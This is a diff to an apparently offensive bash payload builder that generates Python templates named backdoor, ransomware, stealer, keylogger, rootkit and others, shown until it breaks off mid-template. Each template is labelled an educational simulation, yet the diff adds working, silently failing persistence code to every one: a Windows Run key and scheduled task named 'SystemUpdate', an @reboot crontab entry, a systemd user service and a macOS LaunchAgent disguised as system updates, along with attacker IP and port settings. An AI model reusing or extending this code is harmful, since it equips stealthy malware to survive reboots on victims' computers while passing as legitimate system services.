@@ -66,7 +66,7 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed-CrossPlatform"
+SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -92,6 +92,7 @@ DELIVERY_TARGETS=""
 CLOUDFLARE_TUNNEL_ENABLED=false
 CLOUDFLARE_TUNNEL_URL=""
 CLOUDFLARE_TUNNEL_PORT="8080"
+AUTO_EXECUTION=true  # New variable for auto-execution
 
 # Logging system
 init_logging() {
@@ -558,6 +559,22 @@ get_configuration() {
         log_message "INFO" "Using custom filename: $FINAL_NAME"
     fi
 
+    # Auto-execution configuration
+    echo -e "\n${B}AUTO-EXECUTION CONFIGURATION:${NC}"
+    read -p "Enable auto-execution on installation? [Y/n]: " auto_exec
+    AUTO_EXECUTION=true
+    if [[ "$auto_exec" =~ ^[Nn]$ ]]; then
+        AUTO_EXECUTION=false
+    fi
+    
+    if [ "$AUTO_EXECUTION" = true ]; then
+        echo -e "${Y}[*] Auto-execution will be enabled for this payload.${NC}"
+        log_message "INFO" "Auto-execution enabled"
+    else
+        echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
+        log_message "INFO" "Auto-execution disabled"
+    fi
+
     read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
     KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
     if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
@@ -710,6 +727,7 @@ PACKING_METHOD="$PACKING_METHOD"
 SHELLCODE_INJECTION=$SHELLCODE_INJECTION
 PROCESS_HOLLOWING=$PROCESS_HOLLOWING
 RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
+AUTO_EXECUTION=$AUTO_EXECUTION
 KEEP_BUILD_FILES=$KEEP_BUILD_FILES
 DELIVERY_METHOD="$DELIVERY_METHOD"
 DELIVERY_TARGETS="$DELIVERY_TARGETS"
@@ -787,15 +805,15 @@ generate_payload() {
             
             # Create platform-specific payload
             case $type in
-                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
+                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                 *)
                     echo -e "${R}[!] Invalid payload type selected.${NC}"
                     log_message "ERROR" "Invalid payload type: $type"
@@ -854,6 +872,7 @@ Packing Method: $PACKING_METHOD
 Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
+Auto-Execution Enabled: $AUTO_EXECUTION
 Delivery Method: $DELIVERY_METHOD
 EOF
                     
@@ -949,6 +968,7 @@ Build ID: $BUILD_ID
 Timestamp: $BUILD_TIMESTAMP
 Payload Type: $type
 Successfully Built: $success_count/3 platforms
+Auto-Execution Enabled: $AUTO_EXECUTION
 
 Files:
 - launcher.sh: Unix/Linux/macOS launcher script
@@ -962,6 +982,9 @@ Usage:
 2. On Windows: launcher.bat
 
 Each platform-specific executable can also be run directly.
+
+Auto-Execution:
+If enabled, the payload will automatically execute upon installation.
 EOF
         
         echo -e "${G}[+] Cross-platform build complete!${NC}"
@@ -974,15 +997,15 @@ EOF
     else
         # Single platform payload generation (original code)
         case $type in
-            1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-            9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
+            9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
             *)
                 echo -e "${R}[!] Invalid payload type selected.${NC}"
                 log_message "ERROR" "Invalid payload type: $type"
@@ -1042,6 +1065,7 @@ Packing Method: $PACKING_METHOD
 Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
+Auto-Execution Enabled: $AUTO_EXECUTION
 Delivery Method: $DELIVERY_METHOD
 EOF
             
@@ -1057,14 +1081,127 @@ EOF
 
 # Educational payload templates
 create_bricker_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import os
 import sys
 import time
 import platform
+import subprocess
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            import os
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+            # Create scheduled task
+            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon'
+            subprocess.run(task_cmd, shell=True, check=False)
+            
+        elif system == "Linux":
+            # Linux cron job persistence
+            import os
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+            # Create systemd service
+            service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User={os.getenv('USER')}
+
+[Install]
+WantedBy=multi-user.target
+"""
+            
+            service_path = f"/home/{os.getenv('USER')}/.config/systemd/user/system-update.service"
+            os.makedirs(os.path.dirname(service_path), exist_ok=True)
+            with open(service_path, "w") as f:
+                f.write(service_content)
+                
+            subprocess.run(f"systemctl --user enable system-update.service", shell=True, check=False)
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            import os
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     print("=" * 50)
     print("SYSTEM INFORMATION (Educational)")
     print("=" * 50)
@@ -1076,6 +1213,8 @@ def main():
     print("=" * 50)
     print("This is an educational template only.")
     print("No harmful actions are performed.")
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
     print("=" * 50)
     time.sleep(3)
 
@@ -1085,29 +1224,199 @@ EOF
 }
 
 create_backdoor_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import socket
 import time
 import sys
+import platform
+import subprocess
+import os
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+ATTACKER_IP = "$attacker_ip"
+ATTACKER_PORT = "$attacker_port"
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def simulate_connection():
-    print(f"Simulating connection to {sys.argv[1]}:{sys.argv[2]}")
+    print(f"Simulating connection to {ATTACKER_IP}:{ATTACKER_PORT}")
     print("This is an educational simulation only.")
     print("No actual network connections are made.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would establish a persistent connection.")
+    
     time.sleep(2)
 
 if __name__ == "__main__":
-    if len(sys.argv) >= 3:
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    if len(sys.argv) >= 1:
         simulate_connection()
 EOF
 }
 
 create_ransomware_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import os
+import sys
+import platform
+import subprocess
 from cryptography.fernet import Fernet
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def demonstrate_encryption():
     print("Demonstrating file encryption concepts...")
@@ -1120,36 +1429,209 @@ def demonstrate_encryption():
     print(f"Encrypted: {encrypted}")
     print(f"Decrypted: {decrypted}")
     print("This is educational only - no files are modified.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would encrypt files on system startup.")
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     demonstrate_encryption()
 EOF
 }
 
 create_worm_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import socket
 import time
 import sys
+import platform
+import subprocess
+import os
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def simulate_scan():
     print("Simulating network scan...")
     print("This is an educational demonstration only.")
     print("No actual network scanning is performed.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would scan the network on system startup.")
+    
     time.sleep(2)
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     simulate_scan()
 EOF
 }
 
 create_stealer_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import platform
 import os
 import sys
+import subprocess
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def collect_info():
     print("Collecting system information...")
@@ -1164,18 +1646,105 @@ def collect_info():
     for key, value in info.items():
         print(f"  {key}: {value}")
     print("This is educational only - no data is exfiltrated.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would collect information on system startup.")
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     collect_info()
 EOF
 }
 
 create_network_destroyer_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import time
 import random
 import sys
+import platform
+import subprocess
+import os
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def simulate_traffic():
     print("Simulating network traffic patterns...")
@@ -1183,17 +1752,104 @@ def simulate_traffic():
         print(f"Packet {i+1}: {random.randint(64, 1500)} bytes")
         time.sleep(0.1)
     print("This is educational only - no actual traffic is generated.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would generate traffic on system startup.")
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     simulate_traffic()
 EOF
 }
 
 create_keylogger_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import time
 import sys
+import platform
+import subprocess
+import os
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def simulate_keylogger():
     print("Simulating keylogger concepts...")
@@ -1202,18 +1858,104 @@ def simulate_keylogger():
     print("Press any key to see the simulation...")
     time.sleep(2)
     print("Simulation complete - no keys were recorded.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would start logging on system startup.")
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     simulate_keylogger()
 EOF
 }
 
 create_rootkit_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import os
 import time
 import sys
+import platform
+import subprocess
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
